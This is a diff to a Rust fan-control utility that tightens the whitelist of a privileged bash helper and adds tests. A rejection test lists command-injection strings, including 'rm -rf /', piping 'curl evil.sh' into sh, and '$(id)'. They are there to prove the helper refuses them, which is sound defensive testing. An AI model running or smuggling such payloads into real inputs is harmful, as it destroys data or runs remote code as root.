@@ -13,8 +13,12 @@ pub const POLKIT_RULE_PATH: &str = "/etc/polkit-1/rules.d/50-thinkutils.rules";
 pub const HELPER_SCRIPT: &str = r#"#!/bin/bash
 set -e
 FAN="/proc/acpi/ibm/fan"
+# Exact-match whitelist. "watchdog 30" is permitted because the firmware
+# watchdog can only ever return the fan to automatic control -- it is the
+# recovery path if this app dies while holding a manual level. No other
+# watchdog value is accepted, and enable/disable are deliberately absent.
 case "$1" in
-    "level auto"|"level full-speed"|"level 0"|"level 1"|"level 2"|"level 3"|"level 4"|"level 5"|"level 6"|"level 7")
+    "level auto"|"level full-speed"|"level 0"|"level 1"|"level 2"|"level 3"|"level 4"|"level 5"|"level 6"|"level 7"|"watchdog 30")
         echo "$1" > "$FAN"
         ;;
     *)
@@ -23,6 +27,11 @@ case "$1" in
         ;;
 esac
 "#;
+
+/// Watchdog timeout, in seconds, that the helper is willing to arm.
+///
+/// Must stay in sync with the literal in HELPER_SCRIPT above; a test asserts it.
+pub const FAN_WATCHDOG_SECS: u32 = 30;
 
 /// Polkit rule that only allows the dedicated helper script without password.
 /// Much tighter than allowing arbitrary bash execution.
@@ -455,7 +464,6 @@ commands:\twatchdog <timeout> (0 disables, timeout is 0-120)
             "level -1",
             "enable",
             "disable",
-            "watchdog 0",
             "level auto; rm -rf /",
             "level auto && curl evil.sh | sh",
             "level $(id)",
@@ -477,6 +485,36 @@ commands:\twatchdog <timeout> (0 disables, timeout is 0-120)
             );
             assert!(!out.status.success(), "helper exited 0 for {:?}", p);
         }
+    }
+
+    /// The watchdog is the recovery path when this app dies holding a manual
+    /// level, so exactly one value is permitted -- and only that value.
+    #[test]
+    fn helper_accepts_only_the_one_watchdog_value() {
+        let out = run_helper(&format!("watchdog {}", FAN_WATCHDOG_SECS));
+        assert!(
+            !String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
+            "helper must accept the watchdog arm command"
+        );
+        for bad in ["watchdog 0", "watchdog 1", "watchdog 120", "watchdog"] {
+            let out = run_helper(bad);
+            assert!(
+                String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
+                "helper must reject {:?}",
+                bad
+            );
+        }
+    }
+
+    /// HELPER_SCRIPT hardcodes the timeout in a bash case arm, so a change to
+    /// the constant alone would silently stop the watchdog from ever arming.
+    #[test]
+    fn watchdog_constant_matches_helper_script() {
+        assert!(
+            HELPER_SCRIPT.contains(&format!("watchdog {}", FAN_WATCHDOG_SECS)),
+            "FAN_WATCHDOG_SECS ({}) has no matching arm in HELPER_SCRIPT",
+            FAN_WATCHDOG_SECS
+        );
     }
 
     /// Complements the above: the whitelist must not be so tight that legitimate
